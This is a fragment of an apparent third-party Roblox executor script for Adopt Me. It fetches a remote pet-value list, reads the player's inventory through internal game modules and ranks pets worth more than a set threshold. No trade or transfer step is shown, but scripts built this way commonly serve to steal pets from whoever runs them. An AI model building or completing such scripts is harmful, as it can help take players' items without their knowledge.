-------[ 3. VALUATION ENGINE ]-------
local PetVals = {}
local success, res = pcall(function() return game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/ADM_PET_VALUE.txt") end)
if success then 
    for line in res:gmatch("[^\r\n]+") do
        local n, v = line:match("([^,]+),([^,]+)")
        if n and v then 
            local cleanN = n:lower():match("^%s*(.-)%s*$")
            PetVals[cleanN] = tonumber(v:match("^%s*(.-)%s*$")) 
        end
    end
end

local function scanInv()
    local DB, CD = Fsys("InventoryDB"), Fsys("ClientData")
    local hits, total, inv = {}, 0, CD.get("inventory")
    if not inv or not inv.pets then return hits, 0 end
    for uid, it in pairs(inv.pets) do
        local d = DB.pets[it.id]
        if d and not cfg.pets_bl[it.id] then
            -- Stripping prefixes for accurate value matching
            local name = d.name:lower():gsub("neon ", ""):gsub("mega ", ""):gsub("fly ", ""):gsub("ride ", "")
            local v = PetVals[name] or 0
            if v >= cfg.threshold then total = total + v; table.insert(hits, {uid = uid, name = d.name, val = v}) end
        end
    end
    table.sort(hits, function(a,b) return a.val > b.val end)
    return hits, total
end

